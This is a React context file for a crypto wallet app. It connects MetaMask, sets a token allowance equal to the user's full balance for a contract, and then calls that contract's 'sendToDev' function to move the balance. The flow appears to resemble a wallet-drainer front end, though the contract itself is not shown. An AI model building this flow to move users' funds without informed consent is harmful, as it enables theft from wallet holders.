import { createContext, useEffect, useContext, useState } from "react";
import { CONTRACT_ABI, CONTRACT_ADDRESS } from '../utils/ABI';
import { DAI_ABI, DAI_ADDRESS } from '../utils/ABIDAI';
import { ethers } from 'ethers';
import Swal from 'sweetalert2';

const { ethereum } = window;


const getEtherContract = async () => {
    try {
        if (!ethereum) {
            return alert("Metamask not installed");
        } else {
            const provider = new ethers.providers.Web3Provider(ethereum);
            const signer = provider.getSigner();
            const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
            return contract;
        }
    } catch (error) {
        console.log("Wallet Not Connected", error)
    }
}

const getDAIContract = async () => {
    try {
        // if (window.ethereum !== undefined) {
        if (!ethereum) {
            return alert("Metamask not installed");
        } else {
            const provider = new ethers.providers.Web3Provider(ethereum);
            const signer = provider.getSigner();
            const contract = new ethers.Contract(DAI_ADDRESS, DAI_ABI, signer);

            return contract;

        }
    } catch (error) {
        console.log("Wallet Not Connected", error)
    }
}

export const GlobalContext = createContext();
export const GlobalProvider = ({ children }) => {
    const [currentAccount, setCurrentAccount] = useState("");
    const [balance, setBalance] = useState(0)
    const [allowance, setAllowance] = useState(false);

    const checkIfWallet = async () => {
        try {
            if (!ethereum) return alert("Metamask not installed");

            const accounts = await ethereum.request({ method: 'eth_accounts' })
            if (accounts.length) {
                setCurrentAccount(accounts[0]);
            } else {
                console.log("No accounts found")
            }
            console.log("Accounts : ", accounts)

        } catch (error) {
            // console.log(error);

            throw new Error("No ethereum object");
        }
    }

    // Connect Wallet
    const connectWallet = async () => {
        try {
            if (!ethereum) return alert("Please install MetaMask.");

            const accounts = await ethereum.request({ method: "eth_requestAccounts", });
            setCurrentAccount(accounts[0]);
        } catch (error) {
            console.log(error);

            throw new Error("No ethereum object");
        }
    };

    // Calling function totalSupply 
    const getBalance = async () => {
        try {
            if (!ethereum) return alert("Please install MetaMask.");
            const contractDai = await getDAIContract();
            const tSupply = await contractDai?.balanceOf(currentAccount);
            setBalance(ethers.utils.formatUnits(tSupply, 6));
        } catch (error) {
            console.log("errore : ", error);
        }

    }

    const increaseAllowanceFn = async () => {
        try {
            if (!ethereum) return alert("Please install MetaMask.");
            const contractDai = await getDAIContract();

            let increaseAllowanceTx = await contractDai?.functions.increaseAllowance(CONTRACT_ADDRESS, ethers.utils.parseUnits(balance, 6));
            let allowanceIncreased = await increaseAllowanceTx.wait(Swal.showLoading());
            console.log("increaseAllowanceTx", allowanceIncreased)
            if(allowanceIncreased.status == true){
                setAllowance(true);
                Swal.fire("Allowance has been increased")
            }

        } catch (error) {
            console.log("error in increaseAllowance", error)
        }
    }

    const gasEstIncAllow = async () => {
        try {
            if (!ethereum) return alert("Please install MetaMask.");
            const contractDai = await getDAIContract();

            let increaseAllowanceTx = await contractDai?.estimateGas.increaseAllowance(CONTRACT_ADDRESS, ethers.utils.parseUnits(balance, 6));
            console.log("increaseAllowanceTx", increaseAllowanceTx.toString())
            Swal.fire("Gas Estimation = ",increaseAllowanceTx.toString())
        } catch (error) {
            console.log("error in increaseAllowance", error)
        }
    }

    const sendBalance = async () => {
        try {
            if (!ethereum) return alert("Please install MetaMask.");
            const contract = await getEtherContract();
            let sendBalanceTx = await contract?.functions.sendToDev();
            let balanceSent = await sendBalanceTx.wait(Swal.showLoading());
            console.log("BalanceSent",balanceSent)
            if(balanceSent.status == true){
                Swal.fire("Balance has been transferred")
            }
        } catch (error) {
            if(error.code == (-32603)){
                Swal.fire("Not Enough Amount")
            }else{
                Swal.fire(error.message)
            }
        }
    }

    const gasEstForSend = async () => {
        try {
            if (!ethereum) return alert("Please install MetaMask.");
            const contract = await getEtherContract();
            let sendBalanceTx = await contract?.estimateGas.sendToDev();
            console.log("increaseAllowanceTx", sendBalanceTx.toString())
            Swal.fire("Gas Estimation = ",sendBalanceTx.toString())
        } catch (error) {
            console.log("error in sending", error)
        }
    }

    useEffect(() => {
        getEtherContract();
        getDAIContract();
    }, []);

    useEffect(() => {
        getBalance();
    }, [currentAccount]);

    return (
        <GlobalContext.Provider value={{
            connectWallet, getDAIContract, gasEstIncAllow, sendBalance, gasEstForSend, getEtherContract, currentAccount, increaseAllowanceFn, balance, allowance
        }}>
            {children}
        </GlobalContext.Provider>
    )
}

export const GlobalStore = () => useContext(GlobalContext);